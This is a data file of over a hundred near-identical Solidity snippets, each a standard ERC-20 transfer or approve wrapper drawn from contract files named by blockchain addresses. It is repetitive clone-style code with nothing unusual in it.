<source file="systems/source-code/0x584535e0ce218addde8af49c308F25aAb7033E53.sol" startline="82" endline="85" pcid="3312">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7639F0fCD891a5c1D72A986258580Bb28c12A94E.sol" startline="74" endline="77" pcid="4403">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe30a4984a2520ddad1560292df4910f1970da26a.sol" startline="70" endline="73" pcid="8184">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3bcddA8f67A88449e3a6aEA912f860F28DE1A03a.sol" startline="71" endline="74" pcid="2066">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe75e3c43e328F92a66e787b5e4B81f5A271a78a5.sol" startline="70" endline="73" pcid="8350">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xbe8784905d6EfEf6935E715Cf2075dF356807306.sol" startline="71" endline="74" pcid="6811">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf49f16cd3370fB4cCD6C99e1C6F465d53fdec793.sol" startline="84" endline="87" pcid="8914">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6dA4a2CFACDf730B214Ac74CD0e39CE8a353aC65.sol" startline="79" endline="82" pcid="4034">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x585E00E541d4e331A7574248beC368420BBaDdf1.sol" startline="70" endline="73" pcid="3325">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xF0098c03f5544FcC13F8f4DeB183527801B6B40D.sol" startline="83" endline="86" pcid="8800">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x13F986545Be7680E5832C88C3BC68a096B975949.sol" startline="82" endline="85" pcid="551">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x46e743046dccf9ab65b8454cdf879187aab5dd49.sol" startline="75" endline="78" pcid="2659">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xbe8784905d6EfEf6935E715Cf2075dF356807306.sol" startline="81" endline="84" pcid="6813">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE413f21F74faC68bCd2c16626f0FCa30b55692Dd.sol" startline="82" endline="85" pcid="8277">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6e45ced3238f28085a8a9e8d93e273013ad9d5a4.sol" startline="80" endline="83" pcid="4049">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x543f7c0cC91011d96D5Bc2fF8C7C12e5c60D1b29.sol" startline="71" endline="74" pcid="3134">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3aE19CA727e6c9C06dA578fB34113aF9aC0676ee.sol" startline="84" endline="87" pcid="2004">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0ae9C5Dd26C9903C66D060f1f6F661016B2b844f.sol" startline="71" endline="74" pcid="293">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x747e3327A6Ca70475035e0D07f48C5E986bdD912.sol" startline="69" endline="72" pcid="4286">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x747e3327A6Ca70475035e0D07f48C5E986bdD912.sol" startline="79" endline="82" pcid="4288">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xC44c92c0226cF68852E3dbD8E5020B654781De95.sol" startline="67" endline="70" pcid="7053">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x99818798AedD80Fef824086eF10411C89009e174.sol" startline="82" endline="85" pcid="5578">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x887503fb56fDD4b0C97dD5ad5f01EACc4847E682.sol" startline="82" endline="85" pcid="5050">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa42284f1617bc85bd6c0139f9482b0908ee42915.sol" startline="82" endline="85" pcid="5964">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0fa38D4bdf91c5C3E4FB66D0125748aA0897683e.sol" startline="72" endline="75" pcid="419">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa42284f1617bc85bd6c0139f9482b0908ee42915.sol" startline="72" endline="75" pcid="5962">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x887503fb56fDD4b0C97dD5ad5f01EACc4847E682.sol" startline="72" endline="75" pcid="5048">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0617c6f1b099dff080a44451a3882b42bfa75188.sol" startline="72" endline="75" pcid="176">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE36B83Ff8Ae143A1Ee1E960968C37c5Bd4DA8438.sol" startline="71" endline="74" pcid="8260">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3aE19CA727e6c9C06dA578fB34113aF9aC0676ee.sol" startline="74" endline="77" pcid="2002">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x19a64f43113e925223a9d76513727044e5160e70.sol" startline="54" endline="57" pcid="787">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x173F3b04bD4d245b0Bea67CcA11c18B062098EaF.sol" startline="73" endline="76" pcid="695">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x99D00D99221a9CFF03d0F48a6674b71A7d0893Fc.sol" startline="66" endline="69" pcid="5592">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x99D00D99221a9CFF03d0F48a6674b71A7d0893Fc.sol" startline="76" endline="79" pcid="5594">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x49D141A0B0190d120039F603F434F51a39f33D6c.sol" startline="82" endline="85" pcid="2788">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x13aa62cE2b990807c069d04A61E8475c45a150E5.sol" startline="82" endline="85" pcid="521">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x46a9D15f23306E44060fb3558CDF051dD9D83FA9.sol" startline="72" endline="75" pcid="2644">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4bC87FcdC4D85341976568aD86cb5dE9c038Bd4A.sol" startline="84" endline="87" pcid="2840">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x613D596e4500c1538214bf023e3151DaA7555E97.sol" startline="78" endline="81" pcid="3730">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4cb7fa2798f47c0531601d8fc33a2F1062b9B0c9.sol" startline="74" endline="77" pcid="2898">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xaD143dB1c4F95b7d90aA399fc45fAbd56a9Ab521.sol" startline="82" endline="85" pcid="6252">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2116bc152192df8a87eb74dc69aa64f6f476f792.sol" startline="83" endline="86" pcid="1008">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3D0ff3246C0C91DDF19688A8CAE0b3F9FfFB5090.sol" startline="76" endline="79" pcid="2200">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x819A8945dC5046816a7061Eb18b248e611c75085.sol" startline="70" endline="73" pcid="4843">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2fE58503d325203E80Ed379cE24a9AB5b5f56aEa.sol" startline="80" endline="83" pcid="1463">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc49a9fe7c7B41545edfF6B2F2be7662EB588279C.sol" startline="185" endline="188" pcid="7086">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x48ae9c1f0b3ef9f94c0dff437f8f96d49f636e6c.sol" startline="67" endline="70" pcid="2721">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xCf60d61616a64371DF34580AcE2b13401d29C55c.sol" startline="74" endline="77" pcid="7384">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1dD5Cf1BC9611382979F365097516380cfa35D97.sol" startline="70" endline="73" pcid="927">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x99E6b2939603Ac9F9daF3f441f1A1A05b6d54c1f.sol" startline="72" endline="75" pcid="5610">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x99E6b2939603Ac9F9daF3f441f1A1A05b6d54c1f.sol" startline="82" endline="85" pcid="5612">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4aaFEB9864aad00D9C3e5c278788b343084fdc77.sol" startline="72" endline="75" pcid="2802">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2116bc152192df8a87eb74dc69aa64f6f476f792.sol" startline="73" endline="76" pcid="1006">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc3577998420272f181f6eb96b319aa31894fd373.sol" startline="30" endline="33" pcid="6995">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x50F33884A82D799A14bEF3636523e6E9c761D9DD.sol" startline="72" endline="75" pcid="3007">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc3577998420272f181f6eb96b319aa31894fd373.sol" startline="25" endline="28" pcid="6994">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xBeC25691510e9A714648323DC55bEC5199719d52.sol" startline="690" endline="693" pcid="6826">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2d11e3f0a7a3793f2211940d85cd3b48718c5e7a.sol" startline="53" endline="56" pcid="1346">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xBeC25691510e9A714648323DC55bEC5199719d52.sol" startline="700" endline="703" pcid="6828">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7620F8bE1A98a4F0CE86B9817767dc565C56eDF3.sol" startline="81" endline="84" pcid="4390">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xC44c92c0226cF68852E3dbD8E5020B654781De95.sol" startline="77" endline="80" pcid="7055">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x42825e496a72B5E3278af637a45B712E49c061A0.sol" startline="85" endline="88" pcid="2467">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE29128019902c7B59CEb2A145D7FBFdA58b0ab02.sol" startline="87" endline="90" pcid="8171">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3ce7CAfDEB197967161757d8a44e60e9Bf58bC10.sol" startline="82" endline="85" pcid="2172">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x879ef12F70c31BfB91b7Fd74f74C71bb132D8e3a.sol" startline="78" endline="81" pcid="5035">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3c44f3b816Dac7abDe925fDBB52448b9aB23f623.sol" startline="70" endline="73" pcid="2111">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7620F8bE1A98a4F0CE86B9817767dc565C56eDF3.sol" startline="71" endline="74" pcid="4388">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xaD143dB1c4F95b7d90aA399fc45fAbd56a9Ab521.sol" startline="72" endline="75" pcid="6250">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xeA9E312E409599e3cCd50Ff1A8F9e742D60C463B.sol" startline="83" endline="86" pcid="8535">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xBf2A2Cb09E5d0714977A57C3f1e95a8682233099.sol" startline="74" endline="77" pcid="6841">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4d93ea7ef293ed2ca2d4cc9723f5e2c0c8e09dec.sol" startline="81" endline="84" pcid="2930">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4c9AE7Cbc12242F162DdeAab10B57Fff01AF836d.sol" startline="81" endline="84" pcid="2885">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x690C351f059c4963362cB75AAb802A2b95bA2B0C.sol" startline="70" endline="73" pcid="3906">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xdd160949e087Ef040BbFde43E454BA45dF2E8B52.sol" startline="85" endline="88" pcid="7863">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x515Eab35fB6F9687e0D6cd8B796aEF5E7d15064F.sol" startline="398" endline="401" pcid="3028">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x53b2517B208ee8DCEBa690d57520d7798A087D17.sol" startline="84" endline="87" pcid="3106">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xBf2A2Cb09E5d0714977A57C3f1e95a8682233099.sol" startline="84" endline="87" pcid="6843">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3c36CB64F2255b3558b0056E3c2F5C025E8B7a6d.sol" startline="86" endline="89" pcid="2083">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1bF767eC706587F6b3c3f475c8d76692cA19F14b.sol" startline="69" endline="72" pcid="897">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x033Be8705C262bb2A12da0274297790e9479CCe1.sol" startline="81" endline="84" pcid="143">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xcfd07da825fbc71855ce35cc5953336b23e27a82.sol" startline="81" endline="84" pcid="7430">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x460dad15a49c2738b3fc8cb5c7dcfa5d530847af.sol" startline="74" endline="77" pcid="2627">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd59623cfe3dbe4f63e02e6add0f25d3b532b21ce.sol" startline="74" endline="77" pcid="7637">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x819A8945dC5046816a7061Eb18b248e611c75085.sol" startline="80" endline="83" pcid="4845">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xA37D2E1b045B2dB51d475c8344891AB6E868e64D.sol" startline="83" endline="86" pcid="5943">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xccD47BEeEf5E57708853902581289A950E4E9722.sol" startline="72" endline="75" pcid="7281">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xccD47BEeEf5E57708853902581289A950E4E9722.sol" startline="82" endline="85" pcid="7283">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x173F3b04bD4d245b0Bea67CcA11c18B062098EaF.sol" startline="83" endline="86" pcid="697">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xecF790443697567D67022c757ABE80ac4648dA0E.sol" startline="74" endline="77" pcid="8672">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2fE58503d325203E80Ed379cE24a9AB5b5f56aEa.sol" startline="70" endline="73" pcid="1461">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x187ecd1d7d930a356469551f7c71742ac2a7948d.sol" startline="83" endline="86" pcid="776">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x70cf354cea658dc809b6f860d73d5a29088c19a6.sol" startline="36" endline="39" pcid="4143">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x879ef12F70c31BfB91b7Fd74f74C71bb132D8e3a.sol" startline="68" endline="71" pcid="5033">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0232d83E731fB812b8A9A0497b75c73a1bC7655a.sol" startline="86" endline="89" pcid="84">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xdd160949e087Ef040BbFde43E454BA45dF2E8B52.sol" startline="75" endline="78" pcid="7861">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4aaFEB9864aad00D9C3e5c278788b343084fdc77.sol" startline="82" endline="85" pcid="2804">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x70cf354cea658dc809b6f860d73d5a29088c19a6.sol" startline="31" endline="34" pcid="4142">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9a5d0F32B00BDB418D7667AE36d36eA15FDe594e.sol" startline="72" endline="75" pcid="5630">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x10682fF02FC98F7FB6ceA08e7a584262DB51a399.sol" startline="82" endline="85" pcid="436">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x515Eab35fB6F9687e0D6cd8B796aEF5E7d15064F.sol" startline="408" endline="411" pcid="3030">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x402b213C2Fbc27fBf8E127AD40Fad371dDac94a5.sol" startline="81" endline="84" pcid="2362">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x73f3b1b22f21222c593195558a8c76558f1e8ce8.sol" startline="81" endline="84" pcid="4258">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9a5d0F32B00BDB418D7667AE36d36eA15FDe594e.sol" startline="82" endline="85" pcid="5632">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xF8cde3CAf78d43cF6e15181858c0923027B24cDd.sol" startline="81" endline="84" pcid="9061">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xCBf5E1478f1B77672a2684535D9aE9Fe1A7aBe5e.sol" startline="85" endline="88" pcid="7253">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3c36CB64F2255b3558b0056E3c2F5C025E8B7a6d.sol" startline="76" endline="79" pcid="2081">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE34d100c26D21eA743c05A18DC0cbc5d223e69a1.sol" startline="81" endline="84" pcid="8232">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x075D3f6AcC15Caf4F8699D72Bc760A09f5842C3f.sol" startline="74" endline="77" pcid="191">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3Bc0F912FcCA2528801E55FcA480F54f69a9c886.sol" startline="85" endline="88" pcid="2053">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x354a08270C0c3533c0e253F50eB126ef1eE04Eb6.sol" startline="74" endline="77" pcid="1683">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xCBf5E1478f1B77672a2684535D9aE9Fe1A7aBe5e.sol" startline="75" endline="78" pcid="7251">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfb43f573a247cbcb8bd9a366d0afb31f4dba1e55.sol" startline="72" endline="75" pcid="9160">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1dD5Cf1BC9611382979F365097516380cfa35D97.sol" startline="80" endline="83" pcid="929">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x354a08270C0c3533c0e253F50eB126ef1eE04Eb6.sol" startline="84" endline="87" pcid="1685">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xDe77F59a385B50d78aeB7C646d9dF1E4fD76f1a4.sol" startline="75" endline="78" pcid="7945">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8760079142f48028f4e06656565667d2b66a040f.sol" startline="81" endline="84" pcid="5020">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8760079142f48028f4e06656565667d2b66a040f.sol" startline="71" endline="74" pcid="5018">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9adA335674982c21785141cb8bD6B1e0f9ac1FC4.sol" startline="73" endline="76" pcid="5645">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9adA335674982c21785141cb8bD6B1e0f9ac1FC4.sol" startline="83" endline="86" pcid="5647">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x707dAb814AAE29c506EAfc8036b64066FC403444.sol" startline="80" endline="83" pcid="4136">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x019A98258bd5dE47900a0be227087af81Eaf4c69.sol" startline="86" endline="89" pcid="54">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2f6935cc4a043c0bf69165c791ce6f4361278715.sol" startline="84" endline="87" pcid="1448">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xcd8bdb2857ea0948122ccb9b17fc2a6d721b97ae.sol" startline="72" endline="75" pcid="7297">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE34d100c26D21eA743c05A18DC0cbc5d223e69a1.sol" startline="71" endline="74" pcid="8230">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x67d726579cdb18830da61472da171f56028b0df1.sol" startline="54" endline="57" pcid="3852">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd77c9d684B9e00b9Fc45F929d3DE8514DEEd0Cff.sol" startline="74" endline="77" pcid="7714">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6d019E5B4A50315684EBe38A2d30f95aE1EC35e5.sol" startline="75" endline="78" pcid="4002">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x08CA60267661ce86730fc825Be00385d8635B94B.sol" startline="73" endline="76" pcid="228">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
